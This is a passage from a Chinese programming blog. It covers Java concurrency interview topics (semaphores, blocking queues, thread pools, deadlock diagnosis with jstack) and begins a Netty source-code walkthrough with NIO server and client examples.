开始上车...车满了，开始出发...Thread-5 开始上车...Thread-7 开始上车...Thread-2 开始上车...Thread-6 开始上车...车满了，开始出发... 3、Semaphore 假设我们有 3 个停车位，6 辆车去抢 public class SemaphoreDemo { public static void main(String[] args) { Semaphore semaphore = new Semaphore(3); for (int i = 0; i &lt; 6; i++) { new Thread(() -&gt; { try { semaphore.acquire(); // 获取一个许可 System.out.println(Thread.currentThread().getName() + &quot; 抢到车位...&quot;); Thread.sleep(3000); System.out.println(Thread.currentThread().getName() + &quot; 离开车位&quot;); } catch (InterruptedException e) { e.printStackTrace(); } finally { semaphore.release(); // 释放一个许可 } }).start(); } }} 输出 Thread-1 抢到车位...Thread-2 抢到车位...Thread-0 抢到车位...Thread-2 离开车位Thread-0 离开车位Thread-3 抢到车位...Thread-1 离开车位Thread-4 抢到车位...Thread-5 抢到车位...Thread-3 离开车位Thread-5 离开车位Thread-4 离开车位 堵塞队列你知道吗？1、阻塞队列有哪些 ArrayBlockingQueue：是一个基于数组结构的有界阻塞队列，此队列按 FIFO（先进先出）对元素进行排序。 LinkedBlokcingQueue：是一个基于链表结构的阻塞队列，此队列按 FIFO（先进先出）对元素进行排序，吞吐量通常要高于 ArrayBlockingQueue。 SynchronousQueue：是一个不存储元素的阻塞队列，每个插入操作必须等到另一个线程调用移除操作，否则插入操作一直处于阻塞状态，吞吐量通常要高于 LinkedBlokcingQueue。 2、什么是阻塞队列 阻塞队列，顾名思义，首先它是一个队列，而一个阻塞队列在数据结构中所起的作用大致如图所示： 当阻塞队列是空时，从队列中获取元素的操作将会被阻塞。 当阻塞队列是满时，往队列里添加元素的操作将会被阻塞。 核心方法 方法\\行为 抛异常 特定的值 阻塞 超时 插入方法 add(o) offer(o) put(o) offer(o, timeout, timeunit) 移除方法 poll()、remove(o) take() poll(timeout, timeunit) 检查方法 element() peek() 行为解释： 抛异常：如果操作不能马上进行，则抛出异常 特定的值：如果操作不能马上进行，将会返回一个特殊的值，一般是 true 或者 false 阻塞：如果操作不能马上进行，操作会被阻塞 超时：如果操作不能马上进行，操作会被阻塞指定的时间，如果指定时间没执行，则返回一个特殊值，一般是 true 或者 false 插入方法： add(E e)：添加成功返回true，失败抛 IllegalStateException 异常 offer(E e)：成功返回 true，如果此队列已满，则返回 false put(E e)：将元素插入此队列的尾部，如果该队列已满，则一直阻塞 删除方法： remove(Object o) ：移除指定元素,成功返回true，失败返回false poll()：获取并移除此队列的头元素，若队列为空，则返回 null take()：获取并移除此队列头元素，若没有元素则一直阻塞 检查方法： element() ：获取但不移除此队列的头元素，没有元素则抛异常 peek() :获取但不移除此队列的头；若队列为空，则返回 null 3、SynchronousQueue SynchronousQueue，实际上它不是一个真正的队列，因为它不会为队列中元素维护存储空间。与其他队列不同的是，它维护一组线程，这些线程在等待着把元素加入或移出队列。 public class SynchronousQueueDemo { public static void main(String[] args) { SynchronousQueue&lt;Integer&gt; synchronousQueue = new SynchronousQueue&lt;&gt;(); new Thread(() -&gt; { try { synchronousQueue.put(1); Thread.sleep(3000); synchronousQueue.put(2); Thread.sleep(3000); synchronousQueue.put(3); } catch (InterruptedException e) { e.printStackTrace(); } }).start(); new Thread(() -&gt; { try { Integer val = synchronousQueue.take(); System.out.println(val); Integer val2 = synchronousQueue.take(); System.out.println(val2); Integer val3 = synchronousQueue.take(); System.out.println(val3); } catch (InterruptedException e) { e.printStackTrace(); } }).start(); }} 4、使用场景 生产者消费者模式 线程池 消息中间件 synchronized 和 Lock 有什么区别？ 原始结构 synchronized 是关键字属于 JVM 层面，反应在字节码上是 monitorenter 和 monitorexit，其底层是通过 monitor 对象来完成，其实 wait/notify 等方法也是依赖 monitor 对象只有在同步快或方法中才能调用 wait/notify 等方法。 Lock 是具体类（java.util.concurrent.locks.Lock）是 api 层面的锁。 使用方法 synchronized 不需要用户手动去释放锁，当 synchronized 代码执行完后系统会自动让线程释放对锁的占用。 ReentrantLock 则需要用户手动的释放锁，若没有主动释放锁，可能导致出现死锁的现象，lock() 和 unlock() 方法需要配合 try/finally 语句来完成。 等待是否可中断 synchronized 不可中断，除非抛出异常或者正常运行完成。 ReentrantLock 可中断，设置超时方法 tryLock(long timeout, TimeUnit unit)，lockInterruptibly() 放代码块中，调用 interrupt() 方法可中断。 加锁是否公平 synchronized 非公平锁 ReentrantLock 默认非公平锁，构造方法中可以传入 boolean 值，true 为公平锁，false 为非公平锁。 锁可以绑定多个 Condition synchronized 没有 Condition。 ReentrantLock 用来实现分组唤醒需要唤醒的线程们，可以精确唤醒，而不是像 synchronized 要么随机唤醒一个线程要么唤醒全部线程。 线程池使用过吗？谈谈对 ThreadPoolExector 的理解？为什使用线程池，线程池的优势？ 线程池用于多线程处理中，它可以根据系统的情况，可以有效控制线程执行的数量，优化运行效果。线程池做的工作主要是控制运行的线程的数量，处理过程中将任务放入队列，然后在线程创建后启动这些任务，如果线程数量超过了最大数量，那么超出数量的线程排队等候，等其它线程执行完毕，再从队列中取出任务来执行。 主要特点为： 线程复用 控制最大并发数量 管理线程 主要优点 降低资源消耗，通过重复利用已创建的线程来降低线程创建和销毁造成的消耗。 提高相应速度，当任务到达时，任务可以不需要的等到线程创建就能立即执行。 提高线程的可管理性，线程是稀缺资源，如果无限制的创建，不仅仅会消耗系统资源，还会降低体统的稳定性，使用线程可以进行统一分配，调优和监控。 创建线程的几种方式 继承 Thread 实现 Runnable 接口 实现 Callable public class CallableDemo { public static void main(String[] args) throws ExecutionException, InterruptedException { // 在 FutureTask 中传入 Callable 的实现类 FutureTask&lt;Integer&gt; futureTask = new FutureTask&lt;&gt;(new Callable&lt;Integer&gt;() { @Override public Integer call() throws Exception { return 666; } }); // 把 futureTask 放入线程中 new Thread(futureTask).start(); // 获取结果 Integer res = futureTask.get(); System.out.println(res); }} 线程池如果使用？ 架构说明 编码实现 Executors.newSingleThreadExecutor()：只有一个线程的线程池，因此所有提交的任务是顺序执行 Executors.newCachedThreadPool()：线程池里有很多线程需要同时执行，老的可用线程将被新的任务触发重新执行，如果线程超过60秒内没执行，那么将被终止并从池中删除 Executors.newFixedThreadPool()：拥有固定线程数的线程池，如果没有任务执行，那么线程会一直等待 Executors.newScheduledThreadPool()：用来调度即将执行的任务的线程池 Executors.newWorkStealingPool()： newWorkStealingPool适合使用在很耗时的操作，但是newWorkStealingPool不是ThreadPoolExecutor的扩展，它是新的线程池类ForkJoinPool的扩展，但是都是在统一的一个Executors类中实现，由于能够合理的使用CPU进行对任务操作（并行操作），所以适合使用在很耗时的任务中 ThreadPoolExecutor ThreadPoolExecutor作为java.util.concurrent包对外提供基础实现，以内部线程池的形式对外提供管理任务执行，线程调度，线程池管理等等服务。 线程池的几个重要参数介绍？ 参数 作用 corePoolSize 核心线程池大小 maximumPoolSize 最大线程池大小 keepAliveTime 线程池中超过 corePoolSize 数目的空闲线程最大存活时间；可以allowCoreThreadTimeOut(true) 使得核心线程有效时间 TimeUnit keepAliveTime 时间单位 workQueue 阻塞任务队列 threadFactory 新建线程工厂 RejectedExecutionHandler 当提交任务数超过 maxmumPoolSize+workQueue 之和时，任务会交给RejectedExecutionHandler 来处理 说说线程池的底层工作原理？ 重点讲解： 其中比较容易让人误解的是：corePoolSize，maximumPoolSize，workQueue之间关系。 当线程池小于corePoolSize时，新提交任务将创建一个新线程执行任务，即使此时线程池中存在空闲线程。 当线程池达到corePoolSize时，新提交任务将被放入 workQueue 中，等待线程池中任务调度执行。 当workQueue已满，且 maximumPoolSize 大于 corePoolSize 时，新提交任务会创建新线程执行任务。 当提交任务数超过 maximumPoolSize 时，新提交任务由 RejectedExecutionHandler 处理。 当线程池中超过corePoolSize 线程，空闲时间达到 keepAliveTime 时，关闭空闲线程 。 当设置allowCoreThreadTimeOut(true) 时，线程池中 corePoolSize 线程空闲时间达到 keepAliveTime 也将关闭。 线程池用过吗？生产上你如何设置合理参数？线程池的拒绝策略你谈谈？ 是什么 等待队列已经满了，再也塞不下新的任务，同时线程池中的线程数达到了最大线程数，无法继续为新任务服务。 拒绝策略 AbortPolicy：处理程序遭到拒绝将抛出运行时 RejectedExecutionException CallerRunsPolicy：线程调用运行该任务的 execute 本身。此策略提供简单的反馈控制机制，能够减缓新任务的提交速度。 DiscardPolicy：不能执行的任务将被删除 DiscardOldestPolicy：如果执行程序尚未关闭，则位于工作队列头部的任务将被删除，然后重试执行程序（如果再次失败，则重复此过程） 你在工作中单一的、固定数的和可变的三种创建线程池的方法，你用哪个多，超级大坑？ 如果读者对Java中的阻塞队列有所了解的话，看到这里或许就能够明白原因了。 Java中的BlockingQueue主要有两种实现，分别是ArrayBlockingQueue 和 LinkedBlockingQueue。 ArrayBlockingQueue是一个用数组实现的有界阻塞队列，必须设置容量。 LinkedBlockingQueue是一个用链表实现的有界阻塞队列，容量可以选择进行设置，不设置的话，将是一个无边界的阻塞队列，最大长度为Integer.MAX_VALUE。 这里的问题就出在：不设置的话，将是一个无边界的阻塞队列，最大长度为Integer.MAX_VALUE。也就是说，如果我们不设置LinkedBlockingQueue的容量的话，其默认容量将会是Integer.MAX_VALUE。 而newFixedThreadPool中创建LinkedBlockingQueue时，并未指定容量。此时，LinkedBlockingQueue就是一个无边界队列，对于一个无边界队列来说，是可以不断的向队列中加入任务的，这种情况下就有可能因为任务过多而导致内存溢出问题。 上面提到的问题主要体现在newFixedThreadPool和newSingleThreadExecutor两个工厂方法上，并不是说newCachedThreadPool和newScheduledThreadPool这两个方法就安全了，这两种方式创建的最大线程数可能是Integer.MAX_VALUE，而创建这么多线程，必然就有可能导致OOM。 你在工作中是如何使用线程池的，是否自定义过线程池使用？ 自定义线程池 public class ThreadPoolExecutorDemo { public static void main(String[] args) { Executor executor = new ThreadPoolExecutor(2, 3, 1L, TimeUnit.SECONDS, new LinkedBlockingQueue&lt;&gt;(5), Executors.defaultThreadFactory(), new ThreadPoolExecutor.DiscardPolicy()); }} 合理配置线程池你是如果考虑的？ CPU 密集型 CPU 密集的意思是该任务需要大量的运算，而没有阻塞，CPU 一直全速运行。 CPU 密集型任务尽可能的少的线程数量，一般为 CPU 核数 + 1 个线程的线程池。 IO 密集型 由于 IO 密集型任务线程并不是一直在执行任务，可以多分配一点线程数，如 CPU * 2 。 也可以使用公式：CPU 核数 / (1 - 阻塞系数)；其中阻塞系数在 0.8 ～ 0.9 之间。 死锁编码以及定位分析产生死锁的原因 死锁是指两个或两个以上的进程在执行过程中，因争夺资源而造成的一种相互等待的现象，如果无外力的干涉那它们都将无法推进下去，如果系统的资源充足，进程的资源请求都能够得到满足，死锁出现的可能性就很低，否则就会因争夺有限的资源而陷入死锁。 代码 public class DeadLockDemo { public static void main(String[] args) { String lockA = &quot;lockA&quot;; String lockB = &quot;lockB&quot;; DeadLockDemo deadLockDemo = new DeadLockDemo(); Executor executor = Executors.newFixedThreadPool(2); executor.execute(() -&gt; deadLockDemo.method(lockA, lockB)); executor.execute(() -&gt; deadLockDemo.method(lockB, lockA)); } public void method(String lock1, String lock2) { synchronized (lock1) { System.out.println(Thread.currentThread().getName() + &quot;--获取到：&quot; + lock1 + &quot;; 尝试获取：&quot; + lock2); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } synchronized (lock2) { System.out.println(&quot;获取到两把锁!&quot;); } } }} 解决 jps -l 命令查定位进程号 28519 org.jetbrains.jps.cmdline.Launcher32376 com.intellij.idea.Main28521 com.cuzz.thread.DeadLockDemo27836 org.jetbrains.kotlin.daemon.KotlinCompileDaemon28591 sun.tools.jps.Jps jstack 28521 找到死锁查看 2019-05-07 00:04:15Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.191-b12 mixed mode):&quot;Attach Listener&quot; #13 daemon prio=9 os_prio=0 tid=0x00007f7acc001000 nid=0x702a waiting on condition [0x0000000000000000] java.lang.Thread.State: RUNNABLE// ...Found one Java-level deadlock:=============================&quot;pool-1-thread-2&quot;: waiting to lock monitor 0x00007f7ad4006478 (object 0x00000000d71f60b0, a java.lang.String), which is held by &quot;pool-1-thread-1&quot;&quot;pool-1-thread-1&quot;: waiting to lock monitor 0x00007f7ad4003be8 (object 0x00000000d71f60e8, a java.lang.String), which is held by &quot;pool-1-thread-2&quot;Java stack information for the threads listed above:===================================================&quot;pool-1-thread-2&quot;: at com.cuzz.thread.DeadLockDemo.method(DeadLockDemo.java:34) - waiting to lock &lt;0x00000000d71f60b0&gt; (a java.lang.String) - locked &lt;0x00000000d71f60e8&gt; (a java.lang.String) at com.cuzz.thread.DeadLockDemo.lambda$main$1(DeadLockDemo.java:21) at com.cuzz.thread.DeadLockDemo$$Lambda$2/2074407503.run(Unknown Source) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)&quot;pool-1-thread-1&quot;: at com.cuzz.thread.DeadLockDemo.method(DeadLockDemo.java:34) - waiting to lock &lt;0x00000000d71f60e8&gt; (a java.lang.String) - locked &lt;0x00000000d71f60b0&gt; (a java.lang.String) at com.cuzz.thread.DeadLockDemo.lambda$main$0(DeadLockDemo.java:20) at com.cuzz.thread.DeadLockDemo$$Lambda$1/558638686.run(Unknown Source) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)Found 1 deadlock. 最后发现一个死锁。 后续JVM 面试 参考链接 Java内存模型-volatile","link":"/2019/04/16/Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"},{"title":"Netty 源码分析（二）","text":"版本 4.1.15 官网：https://netty.io/ Netty is an asynchronous event-driven network application framework for rapid development of maintainable high performance protocol servers &amp; clients. 先来看一个NIO网络编程服务端/** * @Author: cuzz * @Date: 2019/1/7 15:39 * @Description: */public class NioServer { // 储存客户端连接 private static Map&lt;String, SocketChannel&gt; clientMap = new HashMap&lt;&gt;(); public static void main(String[] args) throws IOException { ServerSocketChannel serverSocketChannel = ServerSocketChannel.open(); serverSocketChannel.configureBlocking(false); ServerSocket serverSocket = serverSocketChannel.socket(); serverSocket.bind(new InetSocketAddress(8899)); Selector selector = Selector.open(); serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT); while (true) { try { selector.select(); Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys(); selectionKeys.forEach(selectionKey -&gt; { try { if (selectionKey.isAcceptable()) { // 可以读 read(selector, selectionKey); } else if (selectionKey.isReadable()) { // 可以写 write(selector, selectionKey); } } catch (IOException e) { e.printStackTrace(); } }); selectionKeys.clear(); // 别忘了清空 } catch (Exception e) { e.printStackTrace(); } } } private static void write(Selector selector, SelectionKey selectionKey) throws IOException{ SocketChannel client = (SocketChannel) selectionKey.channel(); ByteBuffer byteBuffer = ByteBuffer.allocate(512); int read = client.read(byteBuffer); if (read &gt; 0) { byteBuffer.flip(); Charset charset = Charset.forName(&quot;utf-8&quot;); String receiveMessage = String.valueOf(charset.decode(byteBuffer).array()); System.out.println(client + &quot;: &quot; + receiveMessage); String key = null; for (Map.Entry&lt;String, SocketChannel&gt; entry : clientMap.entrySet()) { if (entry.getValue() == client) { key = entry.getKey(); break; } } for (Map.Entry&lt;String, SocketChannel&gt; entry : clientMap.entrySet()) { SocketChannel value = entry.getValue(); ByteBuffer writeBuffer = ByteBuffer.allocate(1024); writeBuffer.put((key + &quot; :&quot; + receiveMessage).getBytes()); writeBuffer.flip(); value.write(writeBuffer); } } } private static void read(Selector selector, SelectionKey selectionKey) throws IOException{ ServerSocketChannel server = (ServerSocketChannel) selectionKey.channel(); System.out.println(server); SocketChannel client = server.accept(); client.configureBlocking(false); client.register(selector, SelectionKey.OP_READ); String key = UUID.randomUUID().toString(); // 保存客户端 clientMap.put(key, client); }} 客服端/** * @Author: cuzz * @Date: 2019/1/8 17:10 * @Description: */public class NioClient { public static void main(String[] args){ try { SocketChannel socketChannel = SocketChannel.open(); socketChannel.configureBlocking(false); Selector selector = Selector.open(); socketChannel.register(selector, SelectionKey.OP_CONNECT); socketChannel.connect(new InetSocketAddress(&quot;127.0.0.1&quot;,8899)); while (true) { selector.select(); Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys(); for (SelectionKey selectionKey : selectionKeys ) { if (selectionKey.isConnectable()) { SocketChannel client = (SocketChannel) selectionKey.channel(); if (client.isConnectionPending()) { client.finishConnect(); System.out.println(client); ByteBuffer writeBuffer = ByteBuffer.allocate(512); writeBuffer.put((LocalDateTime.now() + &quot; 连接成功&quot;).getBytes()); writeBuffer.flip(); client.write(writeBuffer); ExecutorService executorService = Executors.newSingleThreadExecutor(); executorService.submit(() -&gt; { while (true) { InputStreamReader inputStreamReader = new InputStreamReader(System.in); BufferedReader bf = new BufferedReader(inputStreamReader); String message = bf.readLine(); ByteBuffer buffer = ByteBuffer.allocate(512); buffer.put(message.getBytes()); buffer.flip(); client.write(buffer); } }); } client.register(selector, SelectionKey.OP_READ); } else if (selectionKey.isReadable()) { SocketChannel client = (SocketChannel) selectionKey.channel(); ByteBuffer byteBuffer = ByteBuffer.allocate(1024); int read = client.read(byteBuffer); if (read &gt; 0) { String message = new String(byteBuffer.array()); System.out.println(message); } } } selectionKeys.clear(); } } catch (Exception e) { e.printStackTrace(); } }} 代码还是比较复杂的，Netty 内部就是把这些细节给封装起来了 Reactor模式翻译过来为反应器模式，可以先看看由 Doug Lea 写的 Scalable IO in Java ，更好的理解 Netty 的设计模式 还有一篇博客也写得很好，介绍相关理论模型，使用场景，基本组件、整体架构， 这可能是目前最透彻的Netty原理架构解析 Netty 那些事儿 ——— Reactor模式详解 Netty Reactor 工作架构图 bind() 方法前面通过 .channel(NioServerSocketChannel.class) 是为了通过反射创建一个 NioServerSocketChannel 对象 NioServerSocketChannel使用反射创建 NioServerSocketChannel 肯定是通过无参数构造器，在调用 newSocket(DEFAULT_SELECTOR_PROVIDER) 所以这是一个静态方法，返回一个 ServerSocketChannel /** * A {@link io.netty.channel.socket.ServerSocketChannel} implementation which uses * NIO selector based implementation to accept new connections. */public class NioServerSocketChannel extends AbstractNioMessageChannel implements io.netty.channel.socket.ServerSocketChannel { private static final ChannelMetadata METADATA = new ChannelMetadata(false, 16); private static final SelectorProvider DEFAULT_SELECTOR_PROVIDER = SelectorProvider.provider(); private static ServerSocketChannel newSocket(SelectorProvider provider) { try { /** * Use the {@link SelectorProvider} to open {@link SocketChannel} and so remove condition in * {@link SelectorProvider#provider()} which is called by each ServerSocketChannel.open() otherwise. * * See &lt;a href=&quot;https://github.com/netty/netty/issues/2308&quot;&gt;#2308&lt;/a&gt;. */ return provider.openServerSocketChannel(); } catch (IOException e) { throw new ChannelException( &quot;Failed to open a server socket.&quot;, e); } } private final ServerSocketChannelConfig config; /** * Create a new instance */ public NioServerSocketChannel() { this(newSocket(DEFAULT_SELECTOR_PROVIDER)); } /** * Create a new instance using the given {@link SelectorProvider}. */ public NioServerSocketChannel(SelectorProvider provider) { this(newSocket(provider)); } /** * Create a new instance using the given {@link ServerSocketChannel}. */ public NioServerSocketChannel(ServerSocketChannel channel) { super(null, channel, SelectionKey.OP_ACCEPT); config = new NioServerSocketChannelConfig(this, javaChannel().socket()); } ...} AbstractNioChannel我们回到调用的这个构造方法上 public NioServerSocketChannel(ServerSocketChannel channel) { super(null, channel, SelectionKey.OP_ACCEPT); config = new NioServerSocketChannelConfig(this, javaChannel().socket());} 一直调用父类，把 SelectionKey.OP_ACCEPT 设置上，还有设置非堵塞，是不出是很熟悉，这都是对 NIO 进行封装 io.netty.channel.nio.AbstractNioChannel#AbstractNioChannel protected AbstractNioChannel(Channel parent, SelectableChannel ch, int readInterestOp) { super(parent); this.ch = ch; this.readInterestOp = readInterestOp; try { ch.configureBlocking(false); } catch (IOException e) { ... }} 再调用父类，就是设置 Id 和创建管道 io.netty.channel.AbstractChannel protected AbstractChannel(Channel parent) { this.parent = parent; id = newId(); unsafe = newUnsafe(); pipeline = newChannelPipeline();} NioServerSocketChannelConfig我们在回到这个构造方法上，我们重点来看看这个， NioServerSocketChannelConfig 这是一个配置类，Netty 的各种各样的信息都是体现在这个里面 public NioServerSocketChannel(ServerSocketChannel channel) { super(null, channel, SelectionKey.OP_ACCEPT); config = new NioServerSocketChannelConfig(this, javaChannel().socket());} 把自己和刚开始创建的 NIOSocketChannel 的 ServerSocket 对象传入进去 io.netty.channel.DefaultChannelConfig public DefaultChannelConfig(Channel channel) { this(channel, new AdaptiveRecvByteBufAllocator());} 传了一个 AdaptiveRecvByteBufAllocator 翻译过来可以叫可适配的接受字节缓冲适配器 AdaptiveRecvByteBufAllocatorio.netty.channel.AdaptiveRecvByteBufAllocator 文档： The RecvByteBufAllocator that automatically increases and decreases the predicted buffer size on feed back.It gradually increases the expected number of readable bytes if the previous read fully filled the allocated buffer. It gradually decreases the expected number of readable bytes if the read operation was not able to fill a certain amount of the allocated buffer two times consecutively. Otherwise, it keeps returning the same prediction. 构造方法，默认是1024，最小是63，最大是65536 /** * Creates a new predictor with the default parameters. With the default * parameters, the expected buffer size starts from {@code 1024}, does not * go down below {@code 64}, and does not go up above {@code 65536}. */public AdaptiveRecvByteBufAllocator() { this(DEFAULT_MINIMUM, DEFAULT_INITIAL, DEFAULT_MAXIMUM);} 我们在看看里面的内部类 private final class HandleImpl extends MaxMessageHandle { private final int minIndex; private final int maxIndex; private int index; private int nextReceiveBufferSize; private boolean decreaseNow; public HandleImpl(int minIndex, int maxIndex, int initial) { this.minIndex = minIndex; this.maxIndex = maxIndex; index = getSizeTableIndex(initial); nextReceiveBufferSize = SIZE_TABLE[index]; } @Override public int guess() { return nextReceiveBufferSize; } private void record(int actualReadBytes) { if (actualReadBytes &lt;= SIZE_TABLE[Math.max(0, index - INDEX_DECREMENT - 1)]) { if (decreaseNow) { index = Math.max(index - INDEX_DECREMENT, minIndex); nextReceiveBufferSize = SIZE_TABLE[index]; decreaseNow = false; } else { decreaseNow = true; } } else if (actualReadBytes &gt;= nextReceiveBufferSize) { index = Math.min(index + INDEX_INCREMENT, maxIndex); nextReceiveBufferSize = SIZE_TABLE[index]; decreaseNow = false; } } @Override public void readComplete() { record(totalBytesRead()); }} 其父亲 MaxMessageHandle 中，根据记录中的分配，计算出下一次分配的内存 @Overridepublic ByteBuf allocate(ByteBufAllocator alloc) { return alloc.ioBuffer(guess());} 根据系统的支持返回是堆内内存还是堆外内存 @Overridepublic ByteBuf ioBuffer(int initialCapacity) { if (PlatformDependent.hasUnsafe()) { return directBuffer(initialCapacity); } return heapBuffer(initialCapacity);} Pipeline我们回到前面管道的创建 io.netty.channel.AbstractChannel protected AbstractChannel(Channel parent) { this.parent = parent; id = newId(); unsafe = newUnsafe(); pipeline = newChannelPipeline();} io.netty.channel.DefaultChannelPipeline#DefaultChannelPipeline protected DefaultChannelPipeline(Channel channel) { this.channel = ObjectUtil.checkNotNull(channel, &quot;channel&quot;); succeededFuture = new SucceededChannelFuture(channel, null); voidPromise = new VoidChannelPromise(channel, true); tail = new TailContext(this); head = new HeadContext(this); head.next = tail; tail.prev = head;} 这里维护了一个上下文，并且把 Channel 对象赋值给自己，所以 Channel 和 Pipeline 是相互引用的 ChannelPipelineio.netty.channel.ChannelPipeline 文档： A list of ChannelHandlers which handles or intercepts inbound events and outbound operations of a Channel. ChannelPipeline implements an advanced form of the Intercepting Filter pattern to give a user full control over how an event is handled and how the ChannelHandlers in a pipeline interact with each other. Creation of a pipeline Each channel has its own pipeline and it is created automatically when a new channel is created. How an event flows in a pipeline The following diagram describes how I/O events are processed by ChannelHandlers in a ChannelPipeline typically. An I/O event is handled by either a ChannelInboundHandler or a ChannelOutboundHandler and be forwarded to its closest handler by calling the event propagation methods defined in ChannelHandlerContext, such as ChannelHandlerContext.fireChannelRead(Object) and ChannelHandlerContext.write(Object). I/O Request via Channel or ChannelHandlerContext |+---------------------------------------------------+---------------+| ChannelPipeline | || \\|/ || +---------------------+ +-----------+----------+ || | Inbound Handler N | | Outbound Handler 1 | || +----------+----------+ +-----------+----------+ || /|\\ | || | \\|/ || +----------+----------+ +-----------+----------+ || | Inbound Handler N-1 | | Outbound Handler 2 | || +----------+----------+ +-----------+----------+ || /|\\ . || . . || ChannelHandlerContext.fireIN_EVT() ChannelHandlerContext.OUT_EVT()|| [ method call] [method call] || . . || . \\|/ || +----------+----------+ +-----------+----------+ || | Inbound Handler 2 | | Outbound Handler M-1 | || +----------+----------+ +-----------+----------+ || /|\\ | || | \\|/ || +----------+----------+ +-----------+----------+ || | Inbound Handler 1 | | Outbound Handler M | || +----------+----------+ +-----------+----------+ || /|\\ | |+---------------+-----------------------------------+---------------+ | \\|/+---------------+-----------------------------------+---------------+| | | || [ Socket.read() ] [ Socket.write() ] || || Netty Internal I/O Threads (Transport Implementation) |+-------------------------------------------------------------------+ An inbound event is handled by the inbound handlers in the bottom-up direction as shown on the left side of the diagram. An inbound handler usually handles the inbound data generated by the I/O thread on the bottom of the diagram. The inbound data is often read from a remote peer via the actual input operation such as SocketChannel.read(ByteBuffer). If an inbound event goes beyond the top inbound handler, it is discarded silently, or logged if it needs your attention. An outbound event is handled by the outbound handler in the top-down direction as shown on the right side of the diagram. An outbound handler usually generates or transforms the outbound traffic such as write requests. If an outbound event goes beyond the bottom outbound handler, it is handled by an I/O thread associated with the Channel. The I/O thread often performs the actual output operation such as SocketChannel.write(ByteBuffer) For example, let us assume that we created the following pipeline: ChannelPipeline p = ...;p.addLast(&quot;1&quot;, new InboundHandlerA());p.addLast(&quot;2&quot;, new InboundHandlerB());p.addLast(&quot;3&quot;, new OutboundHandlerA());p.addLast(&quot;4&quot;, new OutboundHandlerB());p.addLast(&quot;5&quot;, new InboundOutboundHandlerX()); In the example above, the class whose name starts with Inbound means it is an inbound handler. The class whose name starts with Outbound means it is a outbound handler. In the given example configuration, the handler evaluation order is 1, 2, 3, 4, 5 when an event goes inbound. When an event goes outbound, the order is 5, 4, 3, 2, 1. On top of this principle, ChannelPipeline skips the evaluation of certain handlers to shorten the stack depth: 3 and 4 don’t implement ChannelInboundHandler, and therefore the actual evaluation order of an inbound event will be: 1, 2, and 5. 1 and 2 don’t implement ChannelOutboundHandler, and therefore the actual evaluation order of a outbound event will be: 5, 4, and 3. If 5 implements both ChannelInboundHandler and ChannelOutboundHandler, the evaluation order of an inbound and a outbound event could be 125 and 543 respectively. Forwarding an event to the next handler As you might noticed in the diagram shows, a handler has to invoke the event propagation methods in ChannelHandlerContext to forward an event to its next handler. Those methods include: Inbound event propagation methods ChannelHandlerContext.fireChannelRegistered() hannelHandlerContext.fireChannelActive() ChannelHandlerContext.fireChannelRead(Object) ChannelHandlerContext.fireChannelReadComplete() ChannelHandlerContext.fireExceptionCaught(Throwable) ChannelHandlerContext.fireUserEventTriggered(Object) ChannelHandlerContext.fireChannelWritabilityChanged() ChannelHandlerContext.fireChannelInactive() ChannelHandlerContext.fireChannelUnregistered() Outbound event propagation methods: ChannelHandlerContext.bind(SocketAddress, ChannelPromise) ChannelHandlerContext.connect(SocketAddress, SocketAddress, ChannelPromise) ChannelHandlerContext.write(Object, ChannelPromise) ChannelHandlerContext.flush() ChannelHandlerContext.read() ChannelHandlerContext.disconnect(ChannelPromise) ChannelHandlerContext.close(ChannelPromise) ChannelHandlerContext.deregister(ChannelPromise) and the following example shows how the event propagation is usually done: public class MyInboundHandler extends ChannelInboundHandlerAdapter { @Override public void channelActive(ChannelHandlerContext ctx) { System.out.println(&quot;Connected!&quot;); ctx.fireChannelActive(); }}public class MyOutboundHandler extends ChannelOutboundHandlerAdapter { @Override public void close(ChannelHandlerContext ctx, ChannelPromise promise) { System.out.println(&quot;Closing ..&quot;); ctx.close(promise); }} Building a pipeline (重点) A user is supposed to have one or more ChannelHandlers in a pipeline to receive I/O events (e.g. read) and to request I/O operations (e.g. write and close). For example, a typical server will have the following handlers in each channel’s pipeline, but your mileage may vary depending on the complexity and characteristics of the protocol and business logic: Protocol Decoder - translates binary data (e.g. ByteBuf) into a Java object. Protocol Encoder - translates a Java object into binary data. Business Logic Handler - performs the actual business logic (e.g. database access). and it could be represented as shown in the following example: static final EventExecutorGroup group = new DefaultEventExecutorGroup(16);...ChannelPipeline pipeline = ch.pipeline();pipeline.addLast(&quot;decoder&quot;, new MyProtocolDecoder());pipeline.addLast(&quot;encoder&quot;, new MyProtocolEncoder());// Tell the pipeline to run MyBusinessLogicHandler's event handler methods// in a different thread than an I/O thread so that the I/O thread is not blocked by// a time-consuming task.// If your business logic is fully asynchronous or finished very quickly, you don't// need to specify a group.pipeline.addLast(group, &quot;handler&quot;, new MyBusinessLogicHandler()); 注：可以使用重载这个方法添加一个事件循环组 group 去执行耗时的任务，获取在 MyBusinessLogicHandler 中把耗时部分异步处理，这样就不会堵塞 IO 线程 Thread safety A ChannelHandler can be added or removed at any time because a ChannelPipeline is thread safe. For example, you can insert an encryption handler when sensitive information is about to be exchanged, and remove it after the exchange. 对于传统的过滤器如 SpringMVC 比如我们配置了 Filter1 Filter2 Filter3 过滤器，请求和返回都要经过滤器这3个过滤器，而管道可以选择的其中某些作为请求的过滤器，一些作为返回的过滤器，不一定要一样，入站的处理器专门处理入站的，出站的处理器专门处理出站的 init() 方法io.netty.bootstrap.ServerBootstrap#init @Overridevoid init(Channel channel) throws Exception { final Map&lt;ChannelOption&lt;?&gt;, Object&gt; options = options0(); synchronized (options) { setChannelOptions(channel, options, logger); } final Map&lt;AttributeKey&lt;?&gt;, Object&gt; attrs = attrs0(); synchronized (attrs) { for (Entry&lt;AttributeKey&lt;?&gt;, Object&gt; e: attrs.entrySet()) { @SuppressWarnings(&quot;unchecked&quot;) AttributeKey&lt;Object&gt; key = (AttributeKey&lt;Object&gt;) 